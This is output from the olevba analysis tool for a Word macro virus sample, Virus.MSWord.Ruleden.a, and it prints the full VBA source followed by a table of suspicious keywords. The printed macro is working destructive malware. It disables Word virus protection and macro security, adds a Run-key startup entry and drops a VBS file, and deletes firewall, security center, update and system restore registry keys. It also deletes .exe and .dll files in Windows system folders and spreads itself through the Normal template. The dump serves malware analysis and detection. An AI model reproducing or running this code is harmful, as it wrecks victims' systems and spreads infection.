olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ruleden.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ruleden.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Reading.bas 
in file: Virus.MSWord.Ruleden.a - OLE stream: 'Macros/VBA/Reading'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Global Const HKEY_CURRENT_USER As Long = &H80000001
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002

Private Const KEY_ALL_ACCESS = &H3F
Private Const REG_OPTION_NON_VOLATILE = 0
Global Const REG_SZ As Long = 1

Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, pdwDisposition As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hkey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hkey As Long, ByVal lpSubKey As String) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hkey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hkey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Function SetValueEx(ByVal hkey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
   Dim nValue As Long
   Dim sValue As String
   Select Case lType
      Case REG_SZ
         sValue = vValue & Chr$(0)
         SetValueEx = RegSetValueExString(hkey, sValueName, 0&, lType, sValue, Len(sValue))
      Case REG_DWORD
         nValue = vValue
         SetValueEx = RegSetValueExLong(hkey, sValueName, 0&, lType, nValue, 4)
   End Select
End Function
Public Sub CreateNewKey(sNewKeyName As String, lPredefinedKey As Long)
    Dim hkey As Long
    Dim r As Long
    r = RegCreateKeyEx(lPredefinedKey, sNewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hkey, r)
    Call RegCloseKey(hkey)
End Sub
Public Sub SetKeyValue(sKeyName As String, sValueName As String, vValueSetting As Variant, lValueType As Long)
  Dim f As Long
  Dim r As Long
  Dim hkey As Long
  f = RegOpenKeyEx(HKEY_CURRENT_USER, sKeyName, 0, KEY_ALL_ACCESS, hkey)
  r = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, 0, KEY_ALL_ACCESS, hkey)
  
  f = SetValueEx(hkey, sValueName, lValueType, vValueSetting)
  r = SetValueEx(hkey, sValueName, lValueType, vValueSetting)
  Call RegCloseKey(hkey)
End Sub
Public Function Delete(hkey As Long, ItemKey As String, ValueName As String) As Boolean
    Dim phkResult As Long, retval As Long, retval1 As Long
    If ItemKey <> Empty Then
        If ValueName <> Empty Then
            retval = RegOpenKeyEx(hkey, ItemKey, 0&, KEY_ALL_ACCESS, phkResult)
                If retval = 0 Then
                retval = RegDeleteValue(phkResult, ValueName)
                retval1 = RegCloseKey(phkResult)
                End If
        Else
            retval = RegDeleteKey(hkey, ItemKey)
        End If
        Delete = (retval = 0)
    End If
End Function


Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro Rudelen"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Reading.AutoOpen"
On Error Resume Next
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With

Application.ScreenUpdating = False

MsgBox "You can't open the files!!", vbOKOnly + vbExclamation + vbSystemModal, "Information for you "

Dim MyTime
MyTime = #11:30:00 PM#
Time = MyTime
'It changes the time of the system's clock

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Rudelen", "Saved_Here") = "Rudelen"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Rudelen", "Saved_Here") = "Rudelen"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Showme") = "C:\Windows\Ruden.vbs"
Open "C:\Windows\Ruden.vbs" For Output As #1
Print #1, "WScript.Echo ""Files Unable to open."""
Print #1, "WScript.Echo ""Files not found."""
Print #1, "Dim Msg, Style, Title, Response, MyString"
Print #1, "Msg = ""Internet Explorer Unable to load."""
Print #1, "Style = vbOkOnly + vbCritical"
Print #1, "Title = ""Windows Error Found"""
Print #1, "Response = MsgBox(Msg, Style, Title)"
Print #1, "Dim Message,title1, vv, jj"
Print #1, "Message = ""Error Internet Explorer!"""
Print #1, "vv = vbOKOnly + vbInformation"
Print #1, "title1 = ""Warning!"""
Print #1, "jj = MsgBox(Message, vv, title1)"
Close #1

Dim bb, cc, dd, ee, ff, gg, hh, kk, ll, mm, nn, oo, pp, qq, rr

bb = Delete(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System\", "")
cc = Delete(HKEY_CURRENT_USER, "Software\Microsoft\security center\", "")
dd = Delete(HKEY_LOCAL_MACHINE, "Software\Microsoft\security center\", "")
ee = Delete(HKEY_LOCAL_MACHINE, "Software\Policies\Microsoft\Windows\WindowsUpdate\AU\", "")
ff = Delete(HKEY_LOCAL_MACHINE, "Software\Policies\Microsoft\WindowsFirewall\", "")
gg = Delete(HKEY_LOCAL_MACHINE, "Software\Policies\Microsoft\WindowsFirewall\StandardProfile\", "")
hh = Delete(HKEY_LOCAL_MACHINE, "Software\Microsoft\windows NT\CurrentVersion\systemrestore\", "")
kk = Delete(HKEY_CURRENT_USER, "Software\Microsoft\Windows NT\CurrentVersion\systemrestore\", "")
ll = Delete(HKEY_LOCAL_MACHINE, "Software\Microsoft\Internet Explorer\Main\", "")
mm = Delete(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\", "")
nn = Delete(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\", "")
oo = Delete(HKEY_CURRENT_USER, "Software\Microsoft\MSNMessenger\", "")
pp = Delete(HKEY_CURRENT_USER, "Software\Microsoft\MSN Toolbar\", "")
qq = Delete(HKEY_CURRENT_USER, "Software\Kazaa\Kazaa Lite K++\", "")
rr = Delete(HKEY_LOCAL_MACHINE, "Software\K++\", "")

WordBasic.Kill "C:\WINDOWS\*.exe"
WordBasic.Kill "C:\WINDOWS\*.dll"
WordBasic.Kill "C:\WINDOWS\SYSTEM\*.exe"
WordBasic.Kill "C:\WINDOWS\SYSTEM\*.dll"
WordBasic.Kill "C:\WINDOWS\SYSTEM32\*.exe"
WordBasic.Kill "C:\WINDOWS\SYSTEM32\*.dll"
WordBasic.Kill "C:\WINNT\SYSTEM32\*.exe"
WordBasic.Kill "C:\WINNT\SYSTEM32\*.dll"
WordBasic.Kill "C:\WINNT\*.exe"
WordBasic.Kill "C:\WINNT\*.dll"
WordBasic.Kill "C:\*.exe"
WordBasic.Kill "C:\*.dll"

ActiveDocument.SaveAs FileName:="C:\WINDOWS\Application Data\Roven.doc"
ActiveDocument.SaveAs FileName:="C:\WINNT\SYSTEM32\Bfdv.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\System\Rdcm.doc"
ActiveDocument.SaveAs FileName:="C:\Program Files\Scdl.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Command\Nid.doc"
ActiveDocument.SaveAs FileName:="C:\WINDOWS\HELP\Readme.doc"
ActiveDocument.SaveAs FileName:="C:\Adf.doc"

If Day(Now()) = 1 Or (Day(Now)) = 15 Or (Day(Now)) = 31 Then
Documents.Open FileName:="C:\Windows\System\Rdcm.doc"

If Day(Now()) = 2 Or (Day(Now)) = 4 Or (Day(Now)) = 17 Or (Day(Now)) = 24 Or (Day(Now)) = 31 Then
MsgBox "Files missing today!", vbOKOnly + vbInformation, "Warning "

End If
End If
End Sub


Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro Rudelen"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Reading.AutoClose"
On Error Resume Next

Dim iMacroCount
   Dim i
   Dim Exist
   Dim Instal
   Dim sMe$
   Dim sMacro$
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
      If WordBasic.[MacroName$](i, 0, 0) = "Reading" Then
           Instal = -1
      End If

      If WordBasic.[MacroName$](i, 0, 0) = "Reading" Then
           Exist = -1
       End If
   Next i
   If Not Exist And Not Instal Then
     sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Reading"
       WordBasic.MacroCopy sMacro$, "Global:Reading"
      
   If NormalTemplate.Saved = False Then NormalTemplate.Save
     
 End If
   
   ActiveDocument.Save

End Sub

Sub ToosMacro()
Attribute ToosMacro.VB_Description = "Macro Rudelen"
Attribute ToosMacro.VB_ProcData.VB_Invoke_Func = "Project.Reading.ToosMacro"
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |Ruden.vbs           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

